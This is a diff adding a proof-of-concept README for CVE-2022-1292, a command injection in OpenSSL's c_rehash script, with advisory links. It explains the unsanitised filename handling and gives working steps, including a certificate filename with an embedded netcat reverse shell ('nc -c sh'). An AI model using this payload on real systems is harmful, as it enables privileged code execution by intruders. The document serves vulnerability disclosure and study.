@@ -1,0 +1,33 @@
+# CVE-2022-1292 POC
+![POC Screenshot](https://user-images.githubusercontent.com/105424007/171022147-b7699d2b-7dd3-4b49-9e52-767e36d1d3a2.png)
+
+## Description
+```
+The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. 
+This script is distributed by some operating systems in a manner where it is automatically executed.
+On such operating systems, an attacker could execute arbitrary commands with the privileges of the script.
+Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool.
+
+This script is executed by update-ca-certificates, from
+ca-certificates, to re-hash certificates in /etc/ssl/certs/. An attacker able
+to place files in this directory could execute arbitrary commands with the
+privileges of the script.
+```
+Command injection ocurrs because filenames are not properly sanitized:
+*  ```$fname =~ s/'/'\\''/g;```
+*  ```my ($hash, $fprint) = `"$openssl" crl $crlhash -fingerprint -noout -in '$fname'`;```
+
+This part of the script is vulerable, as closing the backticks allows for command execution, for example a file named: ``` MyCert.crt`whoami` ``` will run "whoami".
+
+## POC
+1. Navigate to ``/etc/ssl/certs/`` (default) or other paths configured in update-ca-certificates
+2. ```echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`nc -c sh 127.0.0.1 12345\`"``` *(nc as payload example)*
+3. Then wait until execution of update-ca-certificates. You can trigger it manually with ``c_rehash .``
+
+## References
+* https://www.cvedetails.com/cve/CVE-2022-1292/
+* https://www.debian.org/security/2022/dsa-5139
+* https://lists.debian.org/debian-lts-announce/2022/05/msg00019.html
+* https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2
+* https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=e5fd1728ef4c7a5bf7c7a7163ca60370460a6e23
+* https://www.openssl.org/news/secadv/20220503.txt
